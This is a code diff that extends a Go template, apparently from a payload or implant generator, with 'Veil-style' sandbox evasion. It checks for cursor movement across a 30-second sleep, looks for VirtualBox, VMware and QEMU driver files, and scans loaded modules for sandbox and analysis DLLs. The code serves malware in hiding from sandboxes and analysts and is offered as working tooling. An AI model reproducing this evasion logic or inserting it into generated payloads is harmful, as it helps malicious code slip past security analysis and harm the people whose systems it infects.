@@ -527,6 +527,9 @@ import (
 	"strings"
 	"sync"
 	"time"
+	"unsafe"
+	
+	"golang.org/x/sys/windows"
 )
 
 const (
@@ -620,9 +623,144 @@ func main() {
 
 {{if .Evasion.EnableSandboxDetection}}
 func checkSandbox() bool {
+	// Basic checks
 	if runtime.NumCPU() < 2 {
 		return true
 	}
+	
+	// Advanced Veil-style sandbox detection
+	// Check cursor movement (Veil technique)
+	if checkCursorMovement() {
+		return true
+	}
+	
+	// Check VM files/DLLs (Veil technique)
+	if checkVMFiles() {
+		return true
+	}
+	
+	return false
+}
+
+// checkCursorMovement detects if cursor moved (Veil technique)
+func checkCursorMovement() bool {
+	user32 := windows.NewLazyDLL("user32.dll")
+	getCursorPos := user32.NewProc("GetCursorPos")
+	
+	type POINT struct {
+		X, Y int32
+	}
+	
+	var pt1 POINT
+	ret1, _, _ := getCursorPos.Call(uintptr(unsafe.Pointer(&pt1)))
+	if ret1 == 0 {
+		return false
+	}
+	
+	// Wait 30 seconds
+	time.Sleep(30 * time.Second)
+	
+	var pt2 POINT
+	ret2, _, _ := getCursorPos.Call(uintptr(unsafe.Pointer(&pt2)))
+	if ret2 == 0 {
+		return false
+	}
+	
+	// If cursor didn't move, likely in sandbox
+	return pt1.X == pt2.X && pt1.Y == pt2.Y
+}
+
+// checkVMFiles checks for VM-specific files and DLLs (Veil technique)
+func checkVMFiles() bool {
+	vmFiles := []string{
+		"C:\\windows\\Sysnative\\Drivers\\Vmmouse.sys",
+		"C:\\windows\\Sysnative\\Drivers\\vboxguest.sys",
+		"C:\\windows\\Sysnative\\Drivers\\VBoxMouse.sys",
+		"C:\\windows\\Sysnative\\Drivers\\VBoxGuest.sys",
+		"C:\\windows\\Sysnative\\Drivers\\VBoxSF.sys",
+		"C:\\windows\\Sysnative\\Drivers\\VBoxVideo.sys",
+		"C:\\windows\\Sysnative\\Drivers\\vmhgfs.sys",
+		"C:\\windows\\Sysnative\\Drivers\\vmci.sys",
+		"C:\\windows\\Sysnative\\Drivers\\vmx_svga.sys",
+		"C:\\windows\\Sysnative\\Drivers\\vmxnet.sys",
+		"C:\\windows\\Sysnative\\Drivers\\vmrawdsk.sys",
+		"C:\\windows\\Sysnative\\Drivers\\vmusbmouse.sys",
+		"C:\\windows\\Sysnative\\Drivers\\vmwaremouse.sys",
+		"C:\\windows\\Sysnative\\Drivers\\vmwareguest.sys",
+		"C:\\windows\\Sysnative\\Drivers\\vmwarevmmem.sys",
+		"C:\\windows\\Sysnative\\Drivers\\vmwarevideo.sys",
+		"C:\\windows\\Sysnative\\Drivers\\vmwaretoolbox.sys",
+		"C:\\windows\\Sysnative\\Drivers\\vmwarevmci.sys",
+		"C:\\windows\\Sysnative\\Drivers\\vmwarevmx86.sys",
+		"C:\\windows\\Sysnative\\Drivers\\qemu-ga.sys",
+	}
+	
+	vmDLLs := []string{
+		"sbiedll.dll",
+		"api_log.dll",
+		"dir_watch.dll",
+		"vmcheck.dll",
+		"wpespy.dll",
+		"fakenet.dll",
+		"pstorec.dll",
+		"vmsrvc.dll",
+		"vmtools.dll",
+		"vmwarebase.dll",
+		"vboxguest.dll",
+		"vboxmouse.dll",
+		"vboxservice.dll",
+		"vboxsf.dll",
+		"qemu-ga.dll",
+	}
+	
+	// Check VM files
+	for _, file := range vmFiles {
+		if _, err := os.Stat(file); err == nil {
+			return true
+		}
+	}
+	
+	// Check loaded DLLs via PEB walking (simplified)
+	// In production, would use NtQueryInformationProcess and enumerate modules
+	kernel32 := windows.NewLazyDLL("kernel32.dll")
+	enumProcessModules := kernel32.NewProc("K32EnumProcessModules")
+	getModuleFileNameEx := kernel32.NewProc("K32GetModuleFileNameExW")
+	
+	if enumProcessModules != nil && getModuleFileNameEx != nil {
+		processHandle := windows.CurrentProcess()
+		var modules [1024]uintptr
+		var needed uint32
+		
+		ret, _, _ := enumProcessModules.Call(
+			uintptr(processHandle),
+			uintptr(unsafe.Pointer(&modules[0])),
+			uintptr(len(modules)*int(unsafe.Sizeof(modules[0]))),
+			uintptr(unsafe.Pointer(&needed)),
+		)
+		
+		if ret != 0 {
+			moduleCount := int(needed) / int(unsafe.Sizeof(modules[0]))
+			for i := 0; i < moduleCount && i < len(modules); i++ {
+				var filename [260]uint16
+				ret, _, _ := getModuleFileNameEx.Call(
+					uintptr(processHandle),
+					modules[i],
+					uintptr(unsafe.Pointer(&filename[0])),
+					260,
+				)
+				
+				if ret != 0 {
+					modulePath := windows.UTF16ToString(filename[:])
+					for _, vmDLL := range vmDLLs {
+						if strings.Contains(strings.ToLower(modulePath), strings.ToLower(vmDLL)) {
+							return true
+						}
+					}
+				}
+			}
+		}
+	}
+	
 	return false
 }
 {{end}}
